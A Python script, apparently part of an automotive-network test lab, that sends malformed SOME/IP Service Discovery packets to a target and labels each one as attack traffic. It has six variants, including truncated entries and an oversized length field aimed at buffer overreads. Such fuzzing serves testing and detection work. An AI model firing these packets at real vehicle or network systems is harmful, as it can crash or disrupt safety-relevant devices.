"""
Malformed SD attack — sends broken/invalid Service Discovery packets
to test how the network reacts to garbage data.

Attack variants:
  1. Truncated SD entry (too short)
  2. Invalid protocol version
  3. Wrong SD service/method IDs
  4. Oversized entries length (buffer overread attempt)
  5. Random garbage bytes with SD-like framing

Usage:
    python -m attacks.malformed_sd [--target-ip 172.20.0.10] [--count 20]
"""

from __future__ import annotations

import argparse
import logging
import os
import random
import socket
import struct
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from proto.someip import SomeIpHeader, SomeIpMessage, pack_someip, MessageType, ReturnCode
from proto.constants import SD_SERVICE_ID, SD_METHOD_ID, SD_PORT
from client.traffic_logger import get_logger

logging.basicConfig(level=logging.INFO, format="%(asctime)s [MALFORMED_SD] %(message)s")
log = logging.getLogger("MalformedSD")


def _make_truncated_sd() -> bytes:
    """SD message with a truncated entry (only 8 bytes instead of 16)."""
    header = SomeIpHeader(
        service_id=SD_SERVICE_ID,
        method_id=SD_METHOD_ID,
        client_id=0x0000,
        session_id=random.randint(1, 0xFFFF),
        message_type=MessageType.NOTIFICATION,
    )
    # SD header with entries_len = 16 but only 8 bytes of entry data
    sd_payload = struct.pack("!B3x", 0x80)  # flags + reserved
    sd_payload += struct.pack("!I", 16)  # claims 16 bytes of entries
    sd_payload += b"\x01\x00\x00\x00\x10\x01\x00\x01"  # only 8 bytes
    sd_payload += struct.pack("!I", 0)  # options length = 0
    return pack_someip(SomeIpMessage(header=header, payload=sd_payload))


def _make_wrong_protocol_version() -> bytes:
    """SOME/IP message with invalid protocol version (0xFF instead of 0x01)."""
    header = SomeIpHeader(
        service_id=SD_SERVICE_ID,
        method_id=SD_METHOD_ID,
        client_id=0x0000,
        session_id=random.randint(1, 0xFFFF),
        protocol_version=0xFF,  # WRONG
        message_type=MessageType.NOTIFICATION,
    )
    sd_payload = struct.pack("!B3xI", 0x80, 0)  # empty entries
    sd_payload += struct.pack("!I", 0)  # empty options
    return pack_someip(SomeIpMessage(header=header, payload=sd_payload))


def _make_wrong_sd_ids() -> bytes:
    """SD-like message with wrong service/method IDs."""
    header = SomeIpHeader(
        service_id=0xFFFE,  # Wrong — should be 0xFFFF
        method_id=0x8101,  # Wrong — should be 0x8100
        message_type=MessageType.NOTIFICATION,
    )
    sd_payload = struct.pack("!B3xI", 0x80, 0)
    sd_payload += struct.pack("!I", 0)
    return pack_someip(SomeIpMessage(header=header, payload=sd_payload))


def _make_oversized_entries_len() -> bytes:
    """SD message claiming enormous entries array (buffer overread attempt)."""
    header = SomeIpHeader(
        service_id=SD_SERVICE_ID,
        method_id=SD_METHOD_ID,
        message_type=MessageType.NOTIFICATION,
    )
    sd_payload = struct.pack("!B3x", 0x80)
    sd_payload += struct.pack("!I", 0xFFFFFFFF)  # Claims 4GB of entries
    sd_payload += b"\x00" * 16  # Actual data is tiny
    sd_payload += struct.pack("!I", 0)
    return pack_someip(SomeIpMessage(header=header, payload=sd_payload))


def _make_garbage_with_sd_framing() -> bytes:
    """Random garbage bytes wrapped in a valid SOME/IP header."""
    header = SomeIpHeader(
        service_id=SD_SERVICE_ID,
        method_id=SD_METHOD_ID,
        message_type=MessageType.NOTIFICATION,
    )
    garbage = bytes(random.randint(0, 255) for _ in range(random.randint(20, 200)))
    return pack_someip(SomeIpMessage(header=header, payload=garbage))


def _make_pure_garbage() -> bytes:
    """Completely random bytes — not even valid SOME/IP."""
    return bytes(random.randint(0, 255) for _ in range(random.randint(16, 512)))


# All attack variant generators
VARIANTS = [
    ("truncated_entry", _make_truncated_sd),
    ("wrong_protocol_version", _make_wrong_protocol_version),
    ("wrong_sd_ids", _make_wrong_sd_ids),
    ("oversized_entries", _make_oversized_entries_len),
    ("garbage_with_framing", _make_garbage_with_sd_framing),
    ("pure_garbage", _make_pure_garbage),
]


def main():
    parser = argparse.ArgumentParser(description="SOME/IP Malformed SD Attack")
    parser.add_argument("--target-ip", default="172.20.0.10")
    parser.add_argument("--sd-port", type=int, default=SD_PORT)
    parser.add_argument("--count", type=int, default=20, help="Total malformed packets to send")
    parser.add_argument("--delay", type=float, default=0.3, help="Delay between packets")
    parser.add_argument("--log-path", default="/logs/traffic.jsonl")
    args = parser.parse_args()

    logger = get_logger(args.log_path)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    log.info("MALFORMED SD starting: %d packets to %s:%d", args.count, args.target_ip, args.sd_port)

    for i in range(args.count):
        variant_name, generator = random.choice(VARIANTS)
        data = generator()

        # Send to target and also broadcast
        sock.sendto(data, (args.target_ip, args.sd_port))

        # Log the attack
        fake_header = SomeIpHeader(
            service_id=SD_SERVICE_ID,
            method_id=SD_METHOD_ID,
            message_type=MessageType.NOTIFICATION,
        )
        logger.log(
            fake_header, data[:64], direction="sent",
            src_ip="attacker", dst_ip=args.target_ip,
            label="malformed_sd",
        )
        log.info("MALFORMED #%d/%d [%s] — %d bytes", i + 1, args.count, variant_name, len(data))
        time.sleep(args.delay)

    log.info("MALFORMED SD complete: %d packets sent", args.count)
    sock.close()


if __name__ == "__main__":
    main()
